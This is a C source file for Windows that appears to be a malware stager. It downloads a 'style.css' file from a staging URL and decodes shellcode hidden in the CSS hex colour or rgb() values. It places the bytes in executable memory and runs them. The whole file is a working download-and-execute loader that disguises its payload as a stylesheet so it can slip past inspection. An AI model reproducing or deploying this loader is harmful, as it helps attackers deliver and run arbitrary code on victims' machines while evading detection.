#include <Windows.h>
#include <stdio.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib");

#define STAGINGURL L"http://127.0.0.1:8080/style.css"

BOOL DecodeCssHex(IN BYTE * cssFile, IN SIZE_T cssFileSize, OUT BYTE ** decPayload, OUT SIZE_T * decPayloadSize) {
    BYTE * payload = NULL;
    SIZE_T payloadSize = 0;

    payload = (BYTE *) VirtualAlloc(NULL, (cssFileSize/2), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!payload) {
        printf("[!] Error calling VirtualAlloc[2]: %d\n", GetLastError());
        return FALSE;
    }

    while(*cssFile++) {
        if (strncmp(cssFile, "#", 1) == 0) {
            BYTE * hexValueStart = cssFile + 1;
            
            for (int i = 0; i < 3; i++) {
                BYTE hexPair[3];
                hexPair[0] = hexValueStart[i * 2];
                hexPair[1] = hexValueStart[i * 2 + 1];
                hexPair[2] = '\0';
            
                payload[payloadSize++] = (BYTE) strtol(hexPair, NULL, 16);
            }
        }
    }

    *decPayload = payload;
    *decPayloadSize = payloadSize;

    return TRUE;
}

BOOL DecodeCssRbg(IN BYTE * cssFile, IN SIZE_T cssFileSize, OUT BYTE ** decPayload, OUT SIZE_T * decPayloadSize) {
    BYTE * payload = NULL;
    SIZE_T payloadSize = 0;

    payload = (BYTE *) VirtualAlloc(NULL, (cssFileSize/2), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!payload) {
        printf("[!] Error calling VirtualAlloc[2]: %d\n", GetLastError());
        return FALSE;
    }

    while(*cssFile++) {
        if (strncmp(cssFile, "rgb", 3) == 0) {
            // Find length of rgb values inside parentheses
            BYTE rgbValueStr[12] = { 0 };
            int counter = 0;
            BYTE * rgbValueStart = cssFile + 4;

            while(1) {
                if (*(rgbValueStart + counter) == ')') {
                    break;
                } else {
                    counter++;
                }
            }

            strncpy(rgbValueStr, rgbValueStart, counter);

            DWORD firstVal = strtol(strtok(rgbValueStr, " "), NULL, 10);
            DWORD secondVal = strtol(strtok(NULL, " "), NULL, 10);
            DWORD thirdVal = strtol(strtok(NULL, " "), NULL, 10);
            BYTE valStr[3] = { (BYTE) firstVal, (BYTE) secondVal, (BYTE) thirdVal };

            for (int i = 0; i < 3; i++) {
                payload[payloadSize++] = valStr[i];
            }
        }
    }

    *decPayload = payload;
    *decPayloadSize = payloadSize;

    return TRUE;
}

BOOL FetchCSS(WCHAR * url, BYTE ** cssFile, SIZE_T * cssFileSize) {
    BOOL state = TRUE;
    HINTERNET hInt = NULL;
    HINTERNET hIntFile = NULL;
    DWORD dwBytesRead = 0;
    SIZE_T sSize = NULL;
    BYTE * pBytes = NULL;
    BYTE * pTmpBytes = NULL;

    hInt = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (hInt == NULL) {
		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
        state = FALSE;
        goto _EndOfFunction;
	}

    hIntFile = InternetOpenUrlW(hInt, url, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hIntFile == NULL) {
		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
        state = FALSE;
        goto _EndOfFunction;
	}

    pTmpBytes = LocalAlloc(LPTR, 1024);
    if (pTmpBytes == NULL) {
        state = FALSE;
        goto _EndOfFunction;
    }

    while(TRUE) {
        if (!InternetReadFile(hIntFile, pTmpBytes, 1024, &dwBytesRead)) {
            printf("Error calling InternetReadFile: %d\n", GetLastError());
            state = FALSE;
            goto _EndOfFunction;
        }

        sSize += dwBytesRead;

        if (pBytes == NULL) {
            pBytes = LocalAlloc(LPTR, dwBytesRead);
        } else {
            pBytes = LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE|LMEM_ZEROINIT);
        }

        memcpy((VOID *)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

        memset(pTmpBytes, '\0', dwBytesRead);

        if (dwBytesRead < 1024) {
            break;
        }
    }

	*cssFile = pBytes;
	*cssFileSize = sSize;
    
_EndOfFunction:
	if (hInt) InternetCloseHandle(hInt);
	if (hIntFile) InternetCloseHandle(hIntFile);
	if (hInt) InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	if (pTmpBytes) LocalFree(pTmpBytes);

    return state;
}

int main(void) {
    BYTE * cssFile = NULL;
    SIZE_T cssFileSize = 0;
    BYTE * decodedPayload = NULL;
    BYTE * encodedPayloadBuf = NULL;
    SIZE_T decodedPayloadSize = 0;

    printf("[i] Fetching CSS file from: %S\n", STAGINGURL);

    if (!FetchCSS(STAGINGURL, &cssFile, &cssFileSize)) {
        printf("[!] Error fetching CSS file.\n");
        goto _EndOfFunc;
    }

    if (cssFileSize == 0) {
        printf("[!] CSS file no content.\n");
        goto _EndOfFunc;
    }

    encodedPayloadBuf = (BYTE *) VirtualAlloc(NULL, cssFileSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!encodedPayloadBuf) {
        printf("[!] Error calling VirtualAlloc: %d\n", GetLastError());
        goto _EndOfFunc;
    }

    RtlMoveMemory(encodedPayloadBuf, cssFile, cssFileSize);

    // Uncomment and comment above to use Hex version    
    // if (!DecodeCssHex(encodedPayloadBuf, cssFileSize, &decodedPayload, &decodedPayloadSize)) {
    //     printf("[!] Error decoding CSS payload\n");
    //     goto _EndOfFunc;
    // }

    printf("[i] Decoding payload from CSS file\n");

    // Uncomment and comment above to use Hex version
    if (!DecodeCssRbg(encodedPayloadBuf, cssFileSize, &decodedPayload, &decodedPayloadSize)) {
        printf("[!] Error decoding CSS payload\n");
        goto _EndOfFunc;
    }

    printf("[i] Executing payload...");

    (*(VOID(*)()) decodedPayload)();

    printf("[i] Execution finished.");

_EndOfFunc:
    if (cssFile) LocalFree(cssFile);
    if (encodedPayloadBuf) VirtualFree(encodedPayloadBuf, cssFileSize, MEM_RELEASE);
    if (decodedPayload) VirtualFree(decodedPayload, cssFileSize, MEM_RELEASE);

    return 0;
}